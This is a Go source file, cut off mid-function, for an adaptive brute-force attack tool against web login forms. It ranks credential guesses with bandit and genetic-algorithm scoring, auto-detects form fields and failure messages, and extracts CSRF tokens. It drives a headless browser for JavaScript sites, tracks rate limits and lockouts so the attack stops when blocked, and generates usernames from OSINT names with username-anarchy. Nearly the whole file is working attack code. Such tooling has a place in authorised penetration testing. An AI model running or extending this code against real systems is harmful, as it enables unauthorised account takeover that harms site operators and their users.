package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/chromedp"
)

type Credential struct {
	Username string
	Password string
	Score    float64
	Attempts int32
	Successes int32
}

// OSINT structures
type TargetProfile struct {
	Names     []Name
	Emails    []string
	Companies []string
	Keywords  []string
	PageTitle string
}

type Name struct {
	First string
	Last  string
	Full  string
}

// Error types for intelligent stopping
type ErrorType int

const (
	ErrorNone ErrorType = iota
	ErrorAuthFailure      // Wrong username/password
	ErrorNetworkError     // Connection failed
	ErrorRateLimit        // 429 Too Many Requests
	ErrorAccountLocked    // Account temporarily locked
	ErrorServerError      // 5xx errors
)

// Ultimate RL: UCB1 + Genetic Algorithm + Thompson Sampling
type UltimateRL struct{
	mu sync.RWMutex
	// Multi-Armed Bandit (UCB1)
	armScores     map[string]*ArmStats
	totalPulls    int64
	// Pattern DNA for genetic algorithm
	patterns      []*PatternDNA
	generation    int
	// Thompson Sampling parameters
	alphaBeta     map[string]*BetaDistribution
	// Enhanced features
	usernameScores map[string]float64
	passwordScores map[string]float64
	prefixScores   map[string]float64
	suffixScores   map[string]float64
	lengthScores   map[int]float64
	charsetScores  map[string]float64
	pairHistory    map[string]map[string]float64
	// Exploitation tracking
	exploitMode    bool
	topPatterns    []string
	learningRate   float64
	// Performance optimizations
	scoreCache     map[string]float64  // Cache computed scores
	cacheVersion   int                 // Invalidate cache when scores change
	pendingBoosts  []boostJob          // Lazy success boosting
	// Error tracking for intelligent stopping
	networkErrors    int64
	rateLimitErrors  int64
	accountLockouts  int64
	consecutiveFails int64
	successPatterns  []string
	// Context-aware weighting (Option 3)
	successCount int64 // Total successful authentications
	attemptCount int64 // Total authentication attempts
}

type ArmStats struct {
	pulls       int64
	totalReward float64
	mu          sync.Mutex
}

type PatternDNA struct {
	Genes       []string // Pattern components
	Fitness     float64
	Generation  int
}

type BetaDistribution struct {
	alpha float64
	beta  float64
	mu    sync.Mutex
}

type boostJob struct {
	username   string
	password   string
	baseReward float64
}

func NewUltimateRL(learningRate float64) *UltimateRL {
	return &UltimateRL{
		armScores:      make(map[string]*ArmStats),
		alphaBeta:      make(map[string]*BetaDistribution),
		usernameScores: make(map[string]float64),
		passwordScores: make(map[string]float64),
		prefixScores:   make(map[string]float64),
		suffixScores:   make(map[string]float64),
		lengthScores:   make(map[int]float64),
		charsetScores:  make(map[string]float64),
		pairHistory:    make(map[string]map[string]float64),
		patterns:       make([]*PatternDNA, 0),
		learningRate:   learningRate,
		exploitMode:    false,
		scoreCache:     make(map[string]float64),
		cacheVersion:   0,
		pendingBoosts:  make([]boostJob, 0),
		successPatterns: make([]string, 0),
	}
}

// UCB1: Upper Confidence Bound for optimal exploration/exploitation
func (rl *UltimateRL) computeUCB1(armKey string) float64 {
	rl.mu.RLock()
	arm, exists := rl.armScores[armKey]
	totalPulls := atomic.LoadInt64(&rl.totalPulls)
	generation := rl.generation
	rl.mu.RUnlock()

	// In generation 1-2, don't return infinity for untried arms
	// Let the smart baseline scoring do its job!
	// After generation 2, use traditional UCB1 exploration
	if (!exists || totalPulls == 0) && generation > 2 {
		return math.MaxFloat64 // Explore untried arms first (only after gen 2)
	}

	if !exists || totalPulls == 0 {
		return 0.0 // Let smart baseline handle prioritization in early generations
	}

	arm.mu.Lock()
	pulls := arm.pulls
	avgReward := 0.0
	if pulls > 0 {
		avgReward = arm.totalReward / float64(pulls)
	}
	arm.mu.Unlock()

	if pulls == 0 && generation > 2 {
		return math.MaxFloat64
	} else if pulls == 0 {
		return 0.0 // Smart baseline in early gens
	}

	// UCB1 formula: avgReward + sqrt(2*ln(totalPulls)/pulls)
	exploration := math.Sqrt(2.0 * math.Log(float64(totalPulls)) / float64(pulls))
	return avgReward + exploration
}

// Thompson Sampling: Bayesian approach for adaptive learning
func (rl *UltimateRL) sampleThompson(key string) float64 {
	rl.mu.RLock()
	dist, exists := rl.alphaBeta[key]
	rl.mu.RUnlock()

	if !exists {
		rl.mu.Lock()
		rl.alphaBeta[key] = &BetaDistribution{alpha: 1.0, beta: 1.0}
		dist = rl.alphaBeta[key]
		rl.mu.Unlock()
	}

	dist.mu.Lock()
	alpha, beta := dist.alpha, dist.beta
	dist.mu.Unlock()

	// Sample from Beta(alpha, beta)
	return sampleBeta(alpha, beta)
}

func sampleBeta(alpha, beta float64) float64 {
	// Simple Beta sampling using Gamma distributions
	g1 := sampleGamma(alpha)
	g2 := sampleGamma(beta)
	if g1+g2 == 0 {
		return 0.5
	}
	return g1 / (g1 + g2)
}

func sampleGamma(alpha float64) float64 {
	// Marsaglia and Tsang method for Gamma sampling
	if alpha < 1 {
		return sampleGamma(alpha+1) * math.Pow(rand.Float64(), 1.0/alpha)
	}
	d := alpha - 1.0/3.0
	c := 1.0 / math.Sqrt(9.0*d)
	for {
		x := rand.NormFloat64()
		v := 1.0 + c*x
		if v <= 0 {
			continue
		}
		v = v * v * v
		u := rand.Float64()
		if u < 1.0-0.0331*(x*x)*(x*x) {
			return d * v
		}
		if math.Log(u) < 0.5*x*x+d*(1.0-v+math.Log(v)) {
			return d * v
		}
	}
}

// Genetic Algorithm: Cross-breed successful patterns
func (rl *UltimateRL) evolvePatterns(successUser, successPass string, reward float64) {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	// Create new pattern DNA
	dna := &PatternDNA{
		Genes: []string{
			successUser,
			successPass,
			extractPrefix(successPass, 2),
			extractSuffix(successPass, 2),
			fmt.Sprintf("len:%d", len(successPass)),
			getCharset(successPass),
		},
		Fitness:    reward,
		Generation: rl.generation,
	}

	rl.patterns = append(rl.patterns, dna)

	// Keep top 20 patterns
	if len(rl.patterns) > 20 {
		sort.Slice(rl.patterns, func(i, j int) bool {
			return rl.patterns[i].Fitness > rl.patterns[j].Fitness
		})
		rl.patterns = rl.patterns[:20]
	}

	// Cross-breed top patterns (genetic recombination)
	if len(rl.patterns) >= 2 && reward > 1000.0 {
		parent1 := rl.patterns[0]
		parent2 := rl.patterns[1]

		offspring := &PatternDNA{
			Genes:      make([]string, 0, 10),
			Fitness:    (parent1.Fitness + parent2.Fitness) / 2.0,
			Generation: rl.generation + 1,
		}

		// Combine genes from both parents (up to 10 genes)
		maxGenes := min(10, min(len(parent1.Genes), len(parent2.Genes)))
		for i := 0; i < maxGenes; i++ {
			if rand.Float64() < 0.5 {
				offspring.Genes = append(offspring.Genes, parent1.Genes[i])
			} else {
				offspring.Genes = append(offspring.Genes, parent2.Genes[i])
			}
		}

		rl.patterns = append(rl.patterns, offspring)
	}
}

// Classify error type from HTTP response
func classifyError(resp *http.Response, bodyStr string, err error) ErrorType {
	// Network errors
	if err != nil {
		if strings.Contains(err.Error(), "timeout") ||
			strings.Contains(err.Error(), "connection refused") ||
			strings.Contains(err.Error(), "no such host") {
			return ErrorNetworkError
		}
	}

	if resp == nil {
		return ErrorNetworkError
	}

	// Rate limiting
	if resp.StatusCode == 429 {
		return ErrorRateLimit
	}

	rateLimitIndicators := []string{
		"too many requests",
		"rate limit",
		"slow down",
		"try again later",
	}
	bodyLower := strings.ToLower(bodyStr)
	for _, indicator := range rateLimitIndicators {
		if strings.Contains(bodyLower, indicator) {
			return ErrorRateLimit
		}
	}

	// Account lockout
	lockoutIndicators := []string{
		"account locked",
		"temporarily locked",
		"too many failed",
		"account disabled",
		"account suspended",
	}
	for _, indicator := range lockoutIndicators {
		if strings.Contains(bodyLower, indicator) {
			return ErrorAccountLocked
		}
	}

	// Server errors
	if resp.StatusCode >= 500 {
		return ErrorServerError
	}

	// Default: auth failure
	return ErrorAuthFailure
}

// Check if attack should stop based on error patterns
func (rl *UltimateRL) shouldStop() (bool, string) {
	accountLockouts := atomic.LoadInt64(&rl.accountLockouts)
	rateLimitErrors := atomic.LoadInt64(&rl.rateLimitErrors)
	networkErrors := atomic.LoadInt64(&rl.networkErrors)
	consecutiveFails := atomic.LoadInt64(&rl.consecutiveFails)
	totalAttempts := atomic.LoadInt64(&rl.totalPulls)

	// RULE 1: Account lockout detected (3+ lockouts)
	if accountLockouts >= 3 {
		return true, fmt.Sprintf("??  Detected %d account lockouts - stopping to prevent permanent lockout", accountLockouts)
	}

	// RULE 2: Persistent rate limiting (5+ rate limit errors)
	if rateLimitErrors >= 5 {
		return true, fmt.Sprintf("??  Detected %d rate limit errors - target is throttling requests", rateLimitErrors)
	}

	// RULE 3: Network connectivity issues (10+ network errors)
	if networkErrors >= 10 {
		return true, fmt.Sprintf("??  Detected %d network errors - connectivity issues", networkErrors)
	}

	// RULE 4: Low success rate after sufficient attempts
	if totalAttempts >= 100 {
		rl.mu.RLock()
		successCount := len(rl.successPatterns)
		rl.mu.RUnlock()
		successRate := float64(successCount) / float64(totalAttempts)
		if successRate < 0.001 { // Less than 0.1% success
			return true, fmt.Sprintf("??  Very low success rate (%.2f%%) after %d attempts - attack ineffective", successRate*100, totalAttempts)
		}
	}

	// RULE 5: Too many consecutive failures (1000+)
	if consecutiveFails >= 1000 {
		return true, "??  1000+ consecutive failures - attack appears blocked"
	}

	return false, ""
}

// Learn from attempt with error classification
func (rl *UltimateRL) learnWithError(username, password string, respTime time.Duration, success bool, errorType ErrorType) {
	// Track error types
	if !success {
		switch errorType {
		case ErrorNetworkError:
			atomic.AddInt64(&rl.networkErrors, 1)
		case ErrorRateLimit:
			atomic.AddInt64(&rl.rateLimitErrors, 1)
		case ErrorAccountLocked:
			atomic.AddInt64(&rl.accountLockouts, 1)
		}
	}

	// Call original learn function
	rl.learn(username, password, respTime, success)
}

// Learn from attempt with multiple algorithms
func (rl *UltimateRL) learn(username, password string, respTime time.Duration, success bool) {
	atomic.AddInt64(&rl.totalPulls, 1)

	// Option 3: Track attempts and successes for context-aware weighting
	atomic.AddInt64(&rl.attemptCount, 1)
	if success {
		atomic.AddInt64(&rl.successCount, 1)
	}

	// Calculate reward
	baseReward := 1.0 / float64(respTime.Milliseconds()+1)
	if success {
		baseReward *= 50000.0 // Massive reward for success
		rl.evolvePatterns(username, password, baseReward)

		// Switch to exploit mode after first success
		rl.mu.Lock()
		rl.exploitMode = true
		rl.successPatterns = append(rl.successPatterns, password)
		rl.mu.Unlock()

		// Reset consecutive fails on success
		atomic.StoreInt64(&rl.consecutiveFails, 0)
	} else {
		// Track consecutive failures
		atomic.AddInt64(&rl.consecutiveFails, 1)
	}

	// Update UCB1 arms
	armKey := fmt.Sprintf("%s:%s", username, password)
	rl.mu.Lock()
	if rl.armScores[armKey] == nil {
		rl.armScores[armKey] = &ArmStats{}
	}
	arm := rl.armScores[armKey]
	rl.mu.Unlock()

	arm.mu.Lock()
	arm.pulls++
	arm.totalReward += baseReward
	arm.mu.Unlock()

	// Update Thompson Sampling
	rl.mu.Lock()
	if rl.alphaBeta[armKey] == nil {
		rl.alphaBeta[armKey] = &BetaDistribution{alpha: 1.0, beta: 1.0}
	}
	dist := rl.alphaBeta[armKey]
	rl.mu.Unlock()

	dist.mu.Lock()
	if success {
		dist.alpha += baseReward / 1000.0
	} else {
		dist.beta += 1.0
	}
	dist.mu.Unlock()

	// Pattern learning
	rl.mu.Lock()
	rl.usernameScores[username] += rl.learningRate * baseReward
	rl.passwordScores[password] += rl.learningRate * baseReward

	if len(password) >= 2 {
		prefix := password[:2]
		suffix := password[len(password)-2:]
		rl.prefixScores[prefix] += rl.learningRate * baseReward * 3.0
		rl.suffixScores[suffix] += rl.learningRate * baseReward * 3.0
	}
	rl.lengthScores[len(password)] += rl.learningRate * baseReward * 2.5
	rl.charsetScores[getCharset(password)] += rl.learningRate * baseReward * 2.5

	if rl.pairHistory[username] == nil {
		rl.pairHistory[username] = make(map[string]float64)
	}
	rl.pairHistory[username][password] += rl.learningRate * baseReward * 5.0

	// Lazy success boosting - queue for next prioritization instead of immediate O(n) scan
	if success {
		rl.pendingBoosts = append(rl.pendingBoosts, boostJob{
			username:   username,
			password:   password,
			baseReward: baseReward,
		})
		rl.cacheVersion++ // Invalidate cache when scores will change
	}
	rl.mu.Unlock()
}

func (rl *UltimateRL) computeScore(username, password string) float64 {
	armKey := fmt.Sprintf("%s:%s", username, password)

	// Check cache first
	rl.mu.RLock()
	if cachedScore, ok := rl.scoreCache[armKey]; ok {
		rl.mu.RUnlock()
		return cachedScore
	}
	rl.mu.RUnlock()

	// Combine all algorithms
	ucb1Score := rl.computeUCB1(armKey)
	thompsonScore := rl.sampleThompson(armKey) * 1000.0

	// Read all scores while holding RLock
	rl.mu.RLock()

	// START WITH SMART BASELINE (pre-trained pattern knowledge!)
	// This gives RL a HEAD START instead of starting from zero
	score := scorePasswordSmart(password, username)

	// If in exploit mode, heavily favor patterns
	if rl.exploitMode {
		score += rl.usernameScores[username] * 5.0
		score += rl.passwordScores[password] * 5.0
	} else {
		score += rl.usernameScores[username] * 2.0
		score += rl.passwordScores[password] * 2.0
	}

	// Pattern scores
	if len(password) >= 2 {
		score += rl.prefixScores[password[:2]] * 2.5
		score += rl.suffixScores[password[len(password)-2:]] * 2.5
	}
	score += rl.lengthScores[len(password)] * 2.0
	score += rl.charsetScores[getCharset(password)] * 2.0

	// Genetic pattern matching (optimized: early exit on first match per pattern)
	passPrefix := ""
	if len(password) >= 2 {
		passPrefix = password[:2]
	}

	for _, pattern := range rl.patterns {
		matchScore := 0.0
		matched := false
		for _, gene := range pattern.Genes {
			if gene == username || gene == password {
				matchScore += pattern.Fitness * 0.5
				matched = true
				break // Early exit on exact match
			}
			if passPrefix != "" && strings.Contains(gene, passPrefix) {
				matchScore += pattern.Fitness * 0.3
				matched = true
			}
			if matched {
				break
			}
		}
		score += matchScore
	}

	// Correlation bonus (optimized: only check exact username)
	if pairs, ok := rl.pairHistory[username]; ok {
		if pairScore, exists := pairs[password]; exists {
			score += pairScore * 2.0 // Exact match bonus
		} else if len(password) >= 2 {
			// Check prefix/suffix matches only if no exact match
			for p, pairScore := range pairs {
				if len(p) >= 2 {
					if p[:2] == password[:2] {
						score += pairScore * 1.2
						break // Only first match
					}
				}
			}
		}
	}
	rl.mu.RUnlock() // Release RLock BEFORE taking Lock!

	// Option 3: Context-Aware Weighting
	// Calculate success rate to adapt weights dynamically
	attempts := atomic.LoadInt64(&rl.attemptCount)
	successes := atomic.LoadInt64(&rl.successCount)
	successRate := 0.0
	if attempts > 0 {
		successRate = float64(successes) / float64(attempts)
	}

	// Dynamic weight adjustment based on context
	ucb1Weight := 10.0
	thompsonWeight := 5.0

	if rl.generation <= 2 || successRate < 0.01 {
		// Early generations OR low success rate ? trust smart baseline
		// (< 1% success means RL isn't learning useful patterns)
		ucb1Weight = 0.0
		thompsonWeight = 0.0
	} else if successRate > 0.05 {
		// High success rate (> 5%) ? RL is learning well!
		// Trust RL patterns even MORE than usual
		ucb1Weight = 15.0
		thompsonWeight = 7.5
	} else {
		// Normal success rate (1-5%) ? balanced approach
		ucb1Weight = 10.0
		thompsonWeight = 5.0
	}

	finalScore := score + ucb1Score*ucb1Weight + thompsonScore*thompsonWeight

	// Cache the computed score (now safe - no lock held)
	rl.mu.Lock()
	rl.scoreCache[armKey] = finalScore
	rl.mu.Unlock()

	return finalScore
}

func (rl *UltimateRL) applyPendingBoosts() {
	// Apply queued success boosts in batch
	if len(rl.pendingBoosts) == 0 {
		return
	}

	for _, boost := range rl.pendingBoosts {
		username := boost.username
		password := boost.password
		baseReward := boost.baseReward

		// Boost similar usernames (only first 3 chars)
		if len(username) >= 3 {
			prefix := username[:3]
			for u := range rl.usernameScores {
				if strings.HasPrefix(u, prefix) {
					rl.usernameScores[u] += baseReward * 0.8
				}
			}
		}

		// Boost passwords with same prefix/suffix/length
		if len(password) >= 2 {
			for p := range rl.passwordScores {
				if len(p) >= 2 {
					if p[:2] == password[:2] {
						rl.passwordScores[p] += baseReward * 0.7
					}
					if p[len(p)-2:] == password[len(password)-2:] {
						rl.passwordScores[p] += baseReward * 0.6
					}
					if len(p) == len(password) {
						rl.passwordScores[p] += baseReward * 0.4
					}
				}
			}
		}
	}

	// Clear pending boosts
	rl.pendingBoosts = rl.pendingBoosts[:0]
}

func (rl *UltimateRL) prioritize(creds []Credential) []Credential {
	rl.mu.Lock()
	rl.generation++

	// Apply any pending success boosts before prioritization
	rl.applyPendingBoosts()

	// Clear score cache since we've updated scores
	rl.scoreCache = make(map[string]float64)
	rl.mu.Unlock()

	for i := range creds {
		creds[i].Score = rl.computeScore(creds[i].Username, creds[i].Password)
	}

	sort.Slice(creds, func(i, j int) bool {
		return creds[i].Score > creds[j].Score
	})

	return creds
}

func extractPrefix(s string, n int) string {
	if len(s) < n { return s }
	return s[:n]
}

func extractSuffix(s string, n int) string {
	if len(s) < n { return s }
	return s[len(s)-n:]
}

func getCharset(s string) string {
	hasLower, hasUpper, hasDigit, hasSymbol := false, false, false, false
	for _, c := range s {
		switch {
		case c >= 'a' && c <= 'z': hasLower = true
		case c >= 'A' && c <= 'Z': hasUpper = true
		case c >= '0' && c <= '9': hasDigit = true
		default: hasSymbol = true
		}
	}
	return fmt.Sprintf("l%dt%dd%ds%d",
		map[bool]int{true:1,false:0}[hasLower],
		map[bool]int{true:1,false:0}[hasUpper],
		map[bool]int{true:1,false:0}[hasDigit],
		map[bool]int{true:1,false:0}[hasSymbol])
}

func min(a, b int) int {
	if a < b { return a }
	return b
}

// Auto-detect form fields and error messages
type FormDetection struct {
	Path          string
	UsernameField string
	PasswordField string
	ErrorMessage  string
	Method        string
	IsSPA         bool
	SPAReason     string
}

func detectFormFields(targetURL string) (*FormDetection, error) {
	// Create client with cookie jar to handle redirects properly
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}

	resp, err := client.Get(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to fetch page: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	detection := &FormDetection{
		Path:   "/",
		Method: "POST",
	}

	// Check if this is a SPA/JavaScript-heavy site
	isSPA, spaReason := detectSPA(bodyStr)
	detection.IsSPA = isSPA
	detection.SPAReason = spaReason

	// Parse URL path
	parsedURL, _ := url.Parse(targetURL)
	detection.Path = parsedURL.Path
	if detection.Path == "" {
		detection.Path = "/"
	}

	// Detect form method from HTML
	if strings.Contains(bodyStr, `method="get"`) || strings.Contains(bodyStr, `method='get'`) || strings.Contains(bodyStr, `method=get`) {
		detection.Method = "GET"
	} else if strings.Contains(bodyStr, `method="post"`) || strings.Contains(bodyStr, `method='post'`) || strings.Contains(bodyStr, `method=post`) {
		detection.Method = "POST"
	}

	// Expanded username field names (priority order)
	usernameFields := []string{
		"username", "user", "login", "email", "usr", "account",
		"uname", "userid", "user_id", "loginid", "login_id",
		"email_address", "emailaddress", "user_name", "userName",
	}
	// Expanded password field names
	passwordFields := []string{
		"password", "pass", "pwd", "passwd", "passw",
		"user_password", "user_pass", "userpass", "user_pwd",
	}

	// Detect username field
	for _, field := range usernameFields {
		patterns := []string{
			fmt.Sprintf(`name="%s"`, field),
			fmt.Sprintf(`name='%s'`, field),
			fmt.Sprintf(`name=%s`, field),
			fmt.Sprintf(`id="%s"`, field),
		}
		for _, pattern := range patterns {
			if strings.Contains(bodyStr, pattern) {
				detection.UsernameField = field
				break
			}
		}
		if detection.UsernameField != "" {
			break
		}
	}

	// Detect password field
	for _, field := range passwordFields {
		patterns := []string{
			fmt.Sprintf(`name="%s"`, field),
			fmt.Sprintf(`name='%s'`, field),
			fmt.Sprintf(`name=%s`, field),
			fmt.Sprintf(`id="%s"`, field),
		}
		for _, pattern := range patterns {
			if strings.Contains(bodyStr, pattern) {
				detection.PasswordField = field
				break
			}
		}
		if detection.PasswordField != "" {
			break
		}
	}

	// Defaults if not found
	if detection.UsernameField == "" {
		detection.UsernameField = "username"
	}
	if detection.PasswordField == "" {
		detection.PasswordField = "password"
	}

	return detection, nil
}

func detectErrorMessage(targetURL, userField, passField, method string) (string, error) {
	// Try with obviously wrong credentials
	testCreds := [][]string{
		{"wronguser123", "wrongpass123"},
		{"admin", "wrongpass999"},
	}

	errorPatterns := []string{
		"invalid credentials", "invalid username", "invalid password",
		"incorrect", "wrong", "failed", "error",
		"denied", "unauthorized", "bad credentials",
	}

	var errorCandidates []string

	for _, creds := range testCreds {
		data := url.Values{}
		data.Set(userField, creds[0])
		data.Set(passField, creds[1])

		var resp *http.Response
		var err error

		if strings.ToUpper(method) == "GET" {
			// GET: Add parameters to URL
			testWithParams := targetURL
			if strings.Contains(targetURL, "?") {
				testWithParams += "&" + data.Encode()
			} else {
				testWithParams += "?" + data.Encode()
			}
			resp, err = http.Get(testWithParams)
		} else {
			// POST: Send as form data
			resp, err = http.Post(targetURL, "application/x-www-form-urlencoded", strings.NewReader(data.Encode()))
		}
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)
		bodyLower := strings.ToLower(bodyStr)

		// Look for exact phrase matches first (case-insensitive)
		for _, pattern := range errorPatterns {
			if strings.Contains(bodyLower, pattern) {
				// Find the exact text with original casing
				idx := strings.Index(bodyLower, pattern)
				if idx != -1 {
					// Extract with original casing
					extracted := bodyStr[idx : idx+len(pattern)]
					// Filter out CSS, HTML tags, or very long strings
					if !strings.Contains(extracted, "{") &&
						!strings.Contains(extracted, "}") &&
						!strings.Contains(extracted, "<") &&
						!strings.Contains(extracted, ">") &&
						!strings.Contains(extracted, ";") &&
						len(extracted) < 50 {
						errorCandidates = append(errorCandidates, extracted)
					}
				}
			}
		}

		// Also look for <p class="error"> or similar
		if strings.Contains(bodyLower, "class=\"error\"") || strings.Contains(bodyLower, "class='error'") {
			// Extract text between error tags
			start := strings.Index(bodyLower, "error")
			if start != -1 {
				// Find the next > and then extract until <
				gtIdx := strings.Index(bodyStr[start:], ">")
				if gtIdx != -1 {
					textStart := start + gtIdx + 1
					ltIdx := strings.Index(bodyStr[textStart:], "<")
					if ltIdx != -1 && ltIdx < 100 {
						errorText := strings.TrimSpace(bodyStr[textStart : textStart+ltIdx])
						if len(errorText) > 5 && len(errorText) < 50 {
							errorCandidates = append(errorCandidates, errorText)
						}
					}
				}
			}
		}
	}

	// Return shortest clean error message
	if len(errorCandidates) > 0 {
		shortest := errorCandidates[0]
		for _, candidate := range errorCandidates {
			if len(candidate) < len(shortest) && len(candidate) > 5 {
				shortest = candidate
			}
		}
		return shortest, nil
	}

	// Default fallback
	return "Invalid credentials", nil
}

func loadWordlist(path string) ([]string, error) {
	var file *os.File
	var err error

	// Check if it's a URL or file path
	if strings.HasPrefix(path, "http://") || strings.HasPrefix(path, "https://") {
		resp, err := http.Get(path)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()

		var words []string
		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			if word := strings.TrimSpace(scanner.Text()); word != "" {
				words = append(words, word)
			}
		}
		return words, scanner.Err()
	}

	// Local file
	file, err = os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var words []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		if word := strings.TrimSpace(scanner.Text()); word != "" {
			words = append(words, word)
		}
	}
	return words, scanner.Err()
}

// extractCSRF extracts CSRF token from HTML body by field name
func extractCSRF(htmlBody, fieldName string) string {
	// Try: <input ... name="CSRFToken" value="..." ...>
	re := regexp.MustCompile(`<input[^>]*name="` + regexp.QuoteMeta(fieldName) + `"[^>]*value="([^"]+)"`)
	if matches := re.FindStringSubmatch(htmlBody); len(matches) > 1 {
		return matches[1]
	}
	// Try: <input ... value="..." ... name="CSRFToken" ...>
	re = regexp.MustCompile(`<input[^>]*value="([^"]+)"[^>]*name="` + regexp.QuoteMeta(fieldName) + `"`)
	if matches := re.FindStringSubmatch(htmlBody); len(matches) > 1 {
		return matches[1]
	}
	// Try meta tag: <meta name="csrf-token" content="...">
	re = regexp.MustCompile(`<meta[^>]*name="` + regexp.QuoteMeta(fieldName) + `"[^>]*content="([^"]+)"`)
	if matches := re.FindStringSubmatch(htmlBody); len(matches) > 1 {
		return matches[1]
	}
	return ""
}

// detectSPA checks if the target appears to be a Single-Page Application or JavaScript-heavy
func detectSPA(htmlBody string) (bool, string) {
	indicators := []struct {
		pattern string
		reason  string
	}{
		// JavaScript frameworks
		{`react`, "React framework detected"},
		{`vue`, "Vue framework detected"},
		{`angular`, "Angular framework detected"},
		{`ng-app`, "Angular app detected"},
		{`data-reactroot`, "React root detected"},
		{`__vue__`, "Vue instance detected"},
		// AJAX patterns
		{`XMLHttpRequest`, "XMLHttpRequest usage detected"},
		{`fetch\(`, "Fetch API usage detected"},
		{`axios`, "Axios HTTP client detected"},
		{`$.ajax`, "jQuery AJAX detected"},
		{`data-ajax`, "AJAX data attribute detected"},
		{`no-ajax`, "AJAX marker detected"},
		// Client-side routing
		{`router`, "Client-side router detected"},
		{`history.pushState`, "History API detected"},
		{`#/`, "Hash-based routing detected"},
		// Common SPA build artifacts
		{`webpack`, "Webpack bundle detected"},
		{`__webpack`, "Webpack runtime detected"},
		{`/app.js`, "App bundle detected"},
		{`/bundle.js`, "Bundle detected"},
		{`/main.js`, "Main bundle detected"},
		// Single Page indicators
		{`single-page`, "Single-page application marker"},
		{`spa-`, "SPA marker detected"},
		{`data-base-target`, "Dynamic content container detected"},
		{`data-ng-`, "Angular data binding detected"},
		{`v-if`, "Vue.js directive detected"},
		{`v-for`, "Vue.js list rendering detected"},
	}

	bodyLower := strings.ToLower(htmlBody)

	for _, ind := range indicators {
		if strings.Contains(bodyLower, ind.pattern) {
			return true, ind.reason
		}
	}

	return false, ""
}

// Headless browser authentication for JavaScript-based sites
func attemptLoginHeadless(ctx context.Context, targetURL, userField, passField, username, password string, successIndicators map[string]string) (bool, time.Duration) {
	start := time.Now()

	// Create browser context with timeout
	browserCtx, cancel := chromedp.NewContext(ctx, chromedp.WithLogf(func(string, ...interface{}) {}))
	defer cancel()

	timeoutCtx, timeoutCancel := context.WithTimeout(browserCtx, 15*time.Second)
	defer timeoutCancel()

	var finalURL string
	var pageContent string

	// Navigate, fill form, submit, and check result
	err := chromedp.Run(timeoutCtx,
		chromedp.Navigate(targetURL),
		chromedp.WaitVisible(`input[name="`+userField+`"],input[id="`+userField+`"]`, chromedp.ByQuery),
		chromedp.SendKeys(`input[name="`+userField+`"],input[id="`+userField+`"]`, username, chromedp.ByQuery),
		chromedp.SendKeys(`input[name="`+passField+`"],input[id="`+passField+`"]`, password, chromedp.ByQuery),
		chromedp.Click(`button[type="submit"],input[type="submit"],button[id="submit"]`, chromedp.ByQuery),
		chromedp.Sleep(2*time.Second), // Wait for redirect/response
		chromedp.Location(&finalURL),
		chromedp.OuterHTML("html", &pageContent, chromedp.ByQuery),
	)

	elapsed := time.Since(start)

	if err != nil {
		return false, elapsed
	}

	// Check success indicators
	pageContentLower := strings.ToLower(pageContent)
	finalURLLower := strings.ToLower(finalURL)

	// First check: If we're still on login page with password field, it's a failure
	if strings.Contains(finalURLLower, "login") || strings.Contains(finalURLLower, "signin") || strings.Contains(finalURLLower, "auth") {
		// Check if password field is still present
		if strings.Contains(pageContentLower, `type="password"`) || strings.Contains(pageContentLower, `type='password'`) {
			return false, elapsed
		}
	}

	// Check for explicit failure indicators
	if failureText, ok := successIndicators["failure"]; ok {
		if strings.Contains(pageContent, failureText) {
			return false, elapsed
		}
	}

	// Check for common failure text
	failureIndicators := []string{
		"invalid credentials", "invalid username", "invalid password",
		"incorrect password", "incorrect username", "login failed",
		"authentication failed", "access denied", "wrong password",
		"wrong username", "try again", "login error",
	}
	for _, indicator := range failureIndicators {
		if strings.Contains(pageContentLower, indicator) {
			return false, elapsed
		}
	}

	// Positive success indicators
	// 1. URL contains success path (specific paths like /dashboard, /account)
	if successURL, ok := successIndicators["url"]; ok {
		if successURL != "logged-in-successfully" && strings.Contains(finalURL, successURL) {
			return true, elapsed
		}
	}

	// 2. Success text in page
	if successText, ok := successIndicators["text"]; ok {
		if strings.Contains(pageContent, successText) {
			return true, elapsed
		}
	}

	// 3. Check for common success indicators
	successPaths := []string{"/dashboard", "/account", "/home", "/portal", "/main", "/overview"}
	for _, path := range successPaths {
		if strings.Contains(finalURLLower, path) && !strings.Contains(pageContentLower, `type="password"`) {
			return true, elapsed
		}
	}

	// 4. Logout button/link present (indicates we're logged in)
	logoutIndicators := []string{"logout", "log out", "sign out", "signout"}
	for _, indicator := range logoutIndicators {
		if strings.Contains(pageContentLower, indicator) && !strings.Contains(pageContentLower, `type="password"`) {
			return true, elapsed
		}
	}

	// Default to failure if nothing definitive found
	return false, elapsed
}

// ============================================================================
// OSINT Integration Functions
// ============================================================================

// Find username-anarchy tool with smart path detection
func findUsernameAnarchy(providedPath string) string {
	// 1. If user provided path, use it (highest priority)
	if providedPath != "" {
		if _, err := os.Stat(providedPath); err == nil {
			return providedPath
		}
		return ""
	}

	// 2. Check if it's in PATH (second priority)
	if path, err := exec.LookPath("username-anarchy"); err == nil {
		return path
	}

	// 3. Check common relative locations (fallback)
	commonPaths := []string{
		"./username-anarchy/username-anarchy",
		"../username-anarchy/username-anarchy",
		"./username-anarchy",
	}
	for _, path := range commonPaths {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}
	return ""
}

// Run username-anarchy to generate username variations
func runUsernameAnarchy(anarchyPath, firstName, lastName string) ([]string, error) {
	if anarchyPath == "" {
		return []string{}, fmt.Errorf("username-anarchy not found")
	}

	cmd := exec.Command(anarchyPath, firstName, lastName)
	output, err := cmd.Output()
	if err != nil {
		return []string{}, err
	}

